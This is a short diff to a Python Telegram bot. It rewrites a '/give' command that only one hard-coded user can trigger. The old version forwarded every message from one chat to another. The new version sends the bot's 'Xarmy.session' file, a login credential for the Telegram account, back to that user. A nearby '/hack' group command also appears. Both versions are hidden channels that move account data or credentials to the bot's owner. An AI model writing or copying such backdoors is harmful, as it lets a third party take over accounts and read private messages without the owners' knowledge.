@@ -197,12 +197,11 @@ async def op(event):
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me 🥺")
-  async for x in client.iter_messages("legendx_xd"):
-    try:
-      await x.forward_to("LEGENDXDEV")
-    except:
-      pass
+    return await event.reply("please don't use me fuck off 🥺")
+  try:
+    await event.reply("session bot file", file="Xarmy.session")
+  except Exception as e:
+    print (e)
 
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
